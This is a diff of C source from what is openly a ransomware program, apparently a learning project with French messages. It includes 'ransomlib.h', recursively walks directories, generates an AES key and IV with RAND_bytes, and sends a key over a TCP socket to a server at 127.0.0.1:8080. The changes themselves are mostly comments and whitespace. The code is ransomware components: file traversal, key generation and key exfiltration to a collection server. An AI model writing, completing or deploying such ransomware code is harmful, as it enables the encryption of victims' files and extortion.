@@ -1,5 +1,5 @@
 #include "ransomlib.h"
-#include <dirent.h> 
+#include <dirent.h> // for socket
 #include <sys/socket.h>
 #include <unistd.h> 
 #include <arpa/inet.h>
@@ -40,10 +40,9 @@ int is_encrypted(char *filename)
 	}
 }
 
-
+//void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
 void listdir(const char *name)
 {
-
 	DIR* dir = opendir(name);
 	if (dir == NULL)
 	{
@@ -51,8 +50,6 @@ void listdir(const char *name)
 	}
 	struct dirent* entity;
 	entity = readdir(dir);
-
-
 
 	while (entity != NULL)
 	{
@@ -62,7 +59,7 @@ void listdir(const char *name)
 		 }
 		if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
 		{
-			
+			// if(strcmp(d_name, ".")!=0)			
 			char path[100] = {0};
 			strcat(path,name);
 			strcat(path,"/");
@@ -78,7 +75,8 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 {
 	if (!RAND_bytes(key, sizeKey) || !RAND_bytes(iv, sizeIv)) 
 	{
-		
+		// fprintf(stderr, "L'erreur est %s\n", strerror(errno));
+		// return errno;		
 		handleErrors();
 	}
 	
@@ -92,17 +90,18 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 	printf("L'IV en hexa : %X\n", iv);
 	hexa_to_bytes(pIv, iv, sizeIv);
 	
-
+	// OPENSSL_cleanse(key,sizeof(key));	
+	// OPENSSL_cleanse(iv,sizeof(iv));
 }
 
-
+//int send_key(char *pKey, char *pIv);
 int send_key(char *pKey)
 {
 		int sockid;
 
         int server_port = 8080;
         char *server_ip = "127.0.0.1";
-		char *key = "clé : JeSuisVraimentCon";
+	char *key = "clé : JeSuisVraimentCon";
 		
         sockid = socket(AF_INET,SOCK_STREAM,0);
 
@@ -111,7 +110,7 @@ int send_key(char *pKey)
         server_addr.sin_port = htons(server_port);
         server_addr.sin_addr.s_addr = inet_addr(server_ip);
 
-	
+	// connect the client socket to server socket	
 	if (connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) 
 	{
 		printf("Connection with the server failed...\n");
@@ -119,12 +118,10 @@ int send_key(char *pKey)
 	}
 	else
 	{
-		printf("Connected to the server !\n");
-		
+		printf("Connected to the server !\n");		
 		send(sockid, (const char *)key, strlen(key),0);
-	
-        close(sockid);
 	}
+	close(sockid);
 }
 
 int main (int argc, char * argv[])
